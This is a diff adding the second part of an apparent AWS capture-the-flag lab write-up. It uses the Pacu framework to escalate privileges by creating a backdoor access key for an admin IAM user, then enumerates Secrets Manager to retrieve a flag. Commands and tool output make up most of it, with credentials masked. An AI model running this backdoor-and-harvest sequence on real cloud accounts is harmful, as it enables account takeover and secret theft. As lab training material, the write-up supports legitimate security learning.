@@ -407,3 +407,119 @@ Running module iam__privesc_scan...
 [iam__privesc_scan] Choose an option:
 
 ```
+Notice that we have one admin user so, we choose option 1. 
+
+```javascript
+//output
+
+[iam__privesc_scan] Choose an option: 1
+[iam__privesc_scan]   Running module iam__backdoor_users_keys...
+[iam__backdoor_users_keys] Backdoor the following users?
+[iam__backdoor_users_keys]   cgidmyjyad3872_admin_user
+[iam__backdoor_users_keys]     Access Key ID: AKIARVEXXXXXXXXXXXXXWG
+[iam__backdoor_users_keys]     Secret Key: fJ+UXXXXXXXXXXXXXXXXXXXXXXXXXXXXA1
+[iam__backdoor_users_keys] iam__backdoor_users_keys completed.
+
+[iam__backdoor_users_keys] MODULE SUMMARY:
+
+  1 user key(s) successfully backdoored.
+
+[iam__privesc_scan] iam__privesc_scan completed.
+
+[iam__privesc_scan] MODULE SUMMARY:
+
+  Privilege escalation was successful
+
+Pacu (beanstalk:imported-second) >
+```
+Pacu creates a new access key for the admin user.
+
+```javascript
+cgidmyjyad3872_admin_user
+Access Key ID: AKIARVEXXXXXXXXXXXXXWG
+Secret Key: fJ+UXXXXXXXXXXXXXXXXXXXXXXXXXXXXA1
+```
+## Configuring the Admin Profile
+
+Using the new admin credentials, set up an AWS CLI profile
+
+```bash
+aws configure --profile admin
+```
+Verify access
+
+```bash
+aws sts get-caller-identity --profile admin
+
+```
+
+```javascript
+//output
+
+{
+    "UserId": "AIDARVEXXXXXXXXXXXXXX5",
+    "Account": "XXXXXXXXXXXX",
+    "Arn": "arn:aws:iam::XXXXXXXXXXXX:user/cgidmyjyadXXXXXX_admin_user"
+}
+```
+
+#B ack to pacu
+
+## Import the admin credentials into Pacu.
+
+```bash
+import_keys admin
+```
+## Retrieving the Final Flag
+
+Finally, with admin privileges, run the secrets enumeration module to retrieve the final flag:
+
+```javascript
+
+Pacu (beanstalk3:imported-admin) > run secrets__enum --region us-east-1
+
+```
+This module will enumerate secrets in AWS Secrets Manager and AWS Systems manager parameter store
+
+```javascript
+//output
+
+Pacu (beanstalk:imported-admin) > run secrets__enum --region us-east-1
+  Running module secrets__enum...
+[secrets__enum] Starting region us-east-1...
+[secrets__enum]  Found secret: cgidmyjyad3872_final_flag
+[secrets__enum] Probing Secret: cgidmyjyad3872_final_flag
+[secrets__enum] Probing parameter store
+[secrets__enum] secrets__enum completed.
+
+[secrets__enum] MODULE SUMMARY:
+
+    1 Secret(s) were found in AWS secretsmanager
+'    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
+    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the value
+```
+## Navigate to the Pacu output directory.
+
+```javascript
+cat ~/.local/share/pacu/<session>/downloads/secrets/secrets_manager/secrets.txt
+```
+## Final flag
+
+``` javascript
+xxxx_final_flag: FLAG{xxxxxxxxxxxxxxxxxxxxxxxx}
+```
+
+## Conclusion
+==========
+
+This lab highlights a common cloud security issue: **storing sensitive credentials inside Elastic Beanstalk environment variables**.
+
+An attacker with access to these resources can:
+
+1. Enumerate Elastic Beanstalk configuration.
+2. Extract embedded AWS credentials.
+3. Pivot into additional IAM users.
+4. Identify privilege escalation paths.
+5. Create access keys for higher-privileged users.
+6. Access sensitive secrets stored in AWS Secrets Manager.
+Access sensitive secrets stored in AWS Secrets Manager.
